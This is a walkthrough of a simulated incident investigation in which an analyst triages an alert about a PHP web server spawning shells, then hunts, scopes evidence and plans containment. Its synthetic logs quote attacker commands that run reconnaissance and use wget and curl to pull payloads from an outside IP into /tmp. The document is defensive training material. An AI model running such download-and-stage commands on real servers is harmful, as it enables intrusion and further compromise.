# PHP2Shell: investigation walkthrough (simulated)

> **Simulated.** This follows the synthetic events in
> `data/synthetic/php_web_events.json`. It's an exercise showing how an analyst
> would work through an alert. There was no real incident.

## 1. The alert

Detection [D002](../detections/D002-php-web-server-starts-shell.md) fires:

| Field | Value |
|---|---|
| Event | `php-evt-0007`, 2026-10-22 13:41:07 UTC |
| Server | `web-api-01` |
| What happened | `php-fpm8.2` started `sh -c id; uname -a` as `www-data` |

A web server running "who am I" and "what system is this". A web app has no
normal reason to do that.

## 2. First checks

**Is the server vulnerable?**

```bash
.venv/bin/python -m threathunt_lab php-versions
```

`web-api-01`: PHP **8.2.20**, PHP-FPM, internet-facing: **VULNERABLE**
(fixed in 8.2.35). So PHP2Shell is possible here.

**What else happened on this server?**

```bash
.venv/bin/python -m threathunt_lab hunt --hunt H002 --step Q4
```

```text
-- Timeline for web-api-01
@timestamp                event.id      user.name  parent -> process   process.command_line
------------------------  ------------  ---------  ------------------  ------------------------------------------------
2026-10-22T13:41:07.000Z  php-evt-0007  www-data   php-fpm8.2 -> sh    sh -c id; uname -a
2026-10-22T13:41:07.100Z  php-evt-0008  www-data   sh -> uname         uname -a
2026-10-22T13:42:30.000Z  php-evt-0009  www-data   php-fpm8.2 -> sh    sh -c cd /tmp; wget -q http://198.51.100.77/x.sh
2026-10-22T13:43:02.000Z  php-evt-0010  www-data   php-fpm8.2 -> curl  curl -s -o /tmp/.k http://198.51.100.77/k
```

D002 alerted on `0007`, `0009` and `0010`. That's **three alerts for one
incident**, so they should be handled together.

**Does the IP show up anywhere else?**

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE process.command_line LIKE "*198.51.100.77*"
| KEEP @timestamp, host.name, user.name, process.parent.name, process.command_line
| SORT @timestamp ASC
```

In the lab, `hunt --hunt H002 --step Q3` shows the same thing: the IP is also
on **web-blog-01** at 15:05 (`php-evt-0012`, hidden behind the mail command).

## 3. Timeline

| Time (UTC, 22 Oct) | Server | What | Source |
|---|---|---|---|
| (21 Oct) | | PHP2Shell fixes released, the day before | Research note |
| 13:41:07 | web-api-01 | `id`, `uname -a` | `php-evt-0007`, `0008` |
| 13:42:30 | web-api-01 | `wget` a script into `/tmp` | `php-evt-0009` |
| 13:43:02 | web-api-01 | `curl` a file to hidden `/tmp/.k` | `php-evt-0010` |
| 15:05:40 | web-blog-01 | `curl` from the same IP | `php-evt-0012` |

## 4. How far does the evidence go?

| Level | What would show it | What we have | Status |
|---|---|---|---|
| 1. Suspicious request | Web logs: unusual upload request, HTTP 500s, PHP memory errors just before 13:41 | No web logs in the lab | **Unknown** |
| 2. Suspicious commands | Process events | `php-evt-0007`–`0010` | **Seen** |
| 3. Possible next stage | Downloads, new tools | `wget` and `curl` command lines | **Attempted.** Can't tell if the downloads worked or ran |
| 4. Compromise | Downloaded files on disk and run, a successful outbound connection, persistence, or the exploit request matched to these commands | Nothing | **Not reached** |

**Conclusion so far:** something made PHP-FPM run commands an attacker would
run. That's **not yet proof of compromise**, and **not proof it was
PHP2Shell**.

## 5. Possible explanations

| Explanation | For | Against | Likelihood |
|---|---|---|---|
| PHP2Shell | Vulnerable version, internet-facing, the day after disclosure, same commands as reported attempts | No web logs to show the request | **Possible** |
| Another bug or an old web shell | Gives the same process events. The same IP on **web-blog-01**, which is patched, means at least one other way in exists there | Nothing found yet on web-api-01 | **Possible** |
| An authorised test (pentest, scanner) | Pentesters use `id` and `uname` too | Hidden file in `/tmp`, bare IP | **Ask the security team** |
| Normal app behaviour | — | No app needs `id` plus downloads from an IP | **Unlikely** |

**Confidence:**
- **High** that web-api-01 ran commands it shouldn't have.
- **Low to medium** that it was PHP2Shell.
- **None** about anything beyond the `www-data` user.

## 6. Evidence to get next

In order:

1. **Web access logs** for web-api-01, 13:35–13:45: upload requests, 500 errors, the client IP
2. **PHP-FPM and error logs**: memory-limit errors, crashing workers
3. **`/tmp/x.sh` and `/tmp/.k`**: copy them and hash them. **Don't run them**
4. **Firewall or network logs**: did web-api-01 or web-blog-01 actually connect to `198.51.100.77`?
5. **Process events after 13:43**: did anything run `x.sh` or `.k`?
6. **New files in the web folder** on both servers (web shells)
7. **web-blog-01** as its own case: patched, so how did it get there?

## 7. Containment

These are suggestions. In a real incident they'd be agreed with the server's
owners.

- **Keep the evidence first**: logs, the `/tmp` files, a disk snapshot.
  Rebuilding the server would wipe them.
- **Cut web-api-01 off the internet**, or block `198.51.100.77` at the
  firewall. Blocking the IP alone is weak, because attackers can change it.
- **Patching isn't enough.** It closes the hole, but doesn't remove anything
  the attacker left behind.
- **Rotate the secrets `www-data` could read** (database passwords, API keys),
  because the bug can also leak memory.

## 8. Remediation

For web-api-01, using the [checklist](php2shell-research.md#remediation-checklist):

- [ ] Update PHP to 8.2.35 and restart PHP-FPM
- [ ] Set `session.upload_progress.enabled = 0`
- [ ] If step 6 confirms a compromise: rebuild from a clean image instead of cleaning by hand
- [ ] Keep D002 running and watch for the same IP or commands again

## 9. Lessons for the lab

- **The lab can raise the alarm, but can't close the case.** Levels 1, 3 and 4
  need web logs, file events and network events.
- **Three alerts for one incident.** Grouping D002 alerts by server and time
  would make triage easier.
- **The version check helped straight away.** It turned "a weird command" into
  "a weird command on a vulnerable, internet-facing server".
